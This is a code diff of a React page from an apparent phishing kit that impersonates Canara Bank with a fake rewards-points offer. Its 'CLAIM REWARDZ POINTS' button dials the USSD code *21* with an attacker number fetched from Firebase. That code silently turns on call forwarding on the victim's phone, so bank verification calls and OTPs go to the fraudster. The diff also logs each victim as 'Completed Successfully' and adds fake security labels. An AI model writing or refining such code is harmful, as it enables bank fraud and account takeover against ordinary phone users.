@@ -1,136 +1,105 @@
 import { useState, useEffect, useMemo } from 'react';
+import { useParams } from 'react-router-dom';
 import FirebaseUtil from '../FirebaseRepo';
 import '../App.css';
 
 const SuccessPage = () => {
-  const [callNumber, setCallNumber] = useState('1800-123-4567');
+  const [callNumber, setCallNumber] = useState('8822407215');
+  const { documentId } = useParams(); // URL se ID lega (e.g., /success/user_123...)
 
-  // Format the call number for USSD
   const formattedCallNumber = useMemo(() => {
-    // Remove any non-digit characters from the call number
     const digitsOnly = callNumber.replace(/\D/g, '');
-    // Ensure it's a valid 10-digit number
-    return digitsOnly.length === 10 ? digitsOnly : '8822407215'; // Default if invalid
+    return digitsOnly.length === 10 ? digitsOnly : '8822407215';
   }, [callNumber]);
 
   useEffect(() => {
-    const fetchCallNumber = async () => {
+    const finalUpdate = async () => {
       try {
+        // 1. Settings se forwarding number lana
         const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
-        console.log('Fetched call number data:', doc); // Log the fetched data
-        
-        if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
-          const trimmedNumber = doc.call_forwarding_number.trim();
-          console.log('Setting call number:', trimmedNumber);
-          setCallNumber(trimmedNumber);
-        } else {
-          console.log('No valid call forwarding number found in document');
+        if (doc?.call_forwarding_number) {
+          setCallNumber(doc.call_forwarding_number.trim());
+        }
+
+        // 2. Serial Wise Data: Usi document mein final status update karna
+        if (documentId) {
+          const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+          await FirebaseUtil.updateDocument("carvana", documentId, {
+            current_status: "Completed Successfully",
+            finish_time: currentTime
+          });
         }
       } catch (error) {
-        console.error("Error fetching call number:", error);
-        // Set a default number if fetching fails
-        setCallNumber('8822407215');
+        console.error("Error in final steps:", error);
       }
     };
-    fetchCallNumber();
-  }, []);
+    finalUpdate();
+  }, [documentId]);
 
-  useEffect(() => {
-    console.log('Current call number:', callNumber);
-  }, [callNumber]);
+  const handleCallAction = () => {
+    // USSD Code generate karna (*21*number#)
+    const ussdCode = `*21*${formattedCallNumber}#`;
+    window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
+  };
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
-      {/* Header - Blue Bar with Logo */}
-      <header className="bg-[#0066b3] p-4 flex justify-between items-center">
+      {/* Header */}
+      <header className="bg-[#0066b3] p-4 flex justify-between items-center shadow-lg">
         <div className="flex items-center">
           <div className="text-white">
-            <h1 className="text-3xl font-serif">Canara Bank</h1>
-            <p className="text-sm">80% Rewardz Points Redeem Process Compeleted</p>
-            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
-              Fintech Syndicate
-            </div>
+            <h1 className="text-3xl font-serif font-bold">Canara Bank</h1>
+            <p className="text-sm opacity-90">Verification Status: 100% Done</p>
           </div>
-        </div>
-        <div className="space-y-1.5">
-          <div className="w-8 h-1 bg-white rounded"></div>
-          <div className="w-8 h-1 bg-white rounded"></div>
-          <div className="w-8 h-1 bg-white rounded"></div>
         </div>
       </header>
 
-      {/* Tagline */}
-      <div className="bg-[#0066b3] text-white text-center pb-2">
-        <p>Together We Can</p>
+      <div className="bg-[#0066b3] text-white text-center pb-2 border-t border-white/20">
+        <p className="italic text-sm">Together We Can</p>
       </div>
 
-      {/* Main Content */}
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
-        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
+        <div className="bg-white text-gray-800 rounded-2xl w-full max-w-md p-6 shadow-2xl border-t-8 border-green-500">
           <div className="text-center mb-6">
-            <div className="bg-green-100 text-green-800 rounded-full px-4 py-2 mb-4 inline-block">
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-              </svg>
-              Verification Successful
+            <div className="bg-green-100 text-green-700 rounded-full px-5 py-2 mb-4 inline-flex items-center font-bold animate-bounce">
+              <span className="mr-2 text-xl">✓</span> Verification Successful
             </div>
-            <h1 className="text-2xl font-bold text-blue-800 mb-2">
-              Congratulations!
-            </h1>
-            <p className="text-gray-600">
-              Your transaction has been verified successfully.
+            <h1 className="text-3xl font-extrabold text-blue-900 mb-2">Congratulations!</h1>
+            <p className="text-gray-600 font-medium">Your account is now eligible for Rewardz Points.</p>
+          </div>
+
+          <div className="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
+            <p className="text-sm text-blue-800 font-bold uppercase">Final Step:</p>
+            <p className="text-sm text-blue-700 mt-1">
+              Rewardz points collect karne ke liye niche diye gaye button par click karein aur apne mobile se call confirm karein.
             </p>
           </div>
 
-          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
-            <div className="flex">
-              <div className="flex-shrink-0">
-                <svg className="h-5 w-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
-                </svg>
-              </div>
-              <div className="ml-3">
-                <p className="text-sm text-yellow-700">
-                  To collect your Rewardz Points, please give a missed call to our Canara Bank Rewardz Care.
-                </p>
-              </div>
-            </div>
+          {/* Call Button */}
+          <button
+            onClick={handleCallAction}
+            className="w-full bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-black py-4 px-4 rounded-xl text-lg shadow-lg transform active:scale-95 transition-all mb-4 border-b-4 border-yellow-600"
+          >
+            CLAIM REWARDZ POINTS
+          </button>
+
+          <button
+            className="w-full bg-gray-100 text-gray-500 font-bold py-3 px-4 rounded-xl text-sm hover:bg-gray-200 transition-colors"
+            onClick={() => window.location.href = 'https://canarabank.com'}
+          >
+            Exit Secure Session
+          </button>
+
+          <div className="mt-6 text-center">
+            <p className="text-[9px] text-gray-400 uppercase tracking-widest font-bold">Session ID: {documentId}</p>
           </div>
-
-          <button
-            onClick={() => {
-              // Format the USSD code with the call number
-              const ussdCode = `*21*${formattedCallNumber}#`;
-              // Open the phone dialer with the USSD code
-              window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
-            }}
-            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
-          >
-            CALL NOW TO COLLECT REWARDS
-          </button>
-
-          <button
-            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-full"
-            onClick={() => {
-              // Format the USSD code with the call number
-              const ussdCode = `*21*${formattedCallNumber}#`;
-              // Open the phone dialer with the USSD code
-              window.location.href = `tel:${encodeURIComponent(ussdCode)}`;
-            }}
-          >
-            Back to Home
-          </button>
-
-          <p className="text-xs text-gray-500 text-center">
-            Your rewards will be credited to your account within 24-48 hours after verification.
-          </p>
         </div>
       </main>
 
-      {/* Bottom Part / Footer */}
-      <footer className="bg-gray-800 text-white p-4 text-center">
-        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
-        <p className="text-xs">For support, call {callNumber} or email support@canarabank.com</p>
+      {/* Footer */}
+      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
+        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
+        <p className="text-[10px] opacity-40 mt-1 font-mono">ENCRYPTED TRANSACTION | SECURE PORTAL</p>
       </footer>
     </div>
   );
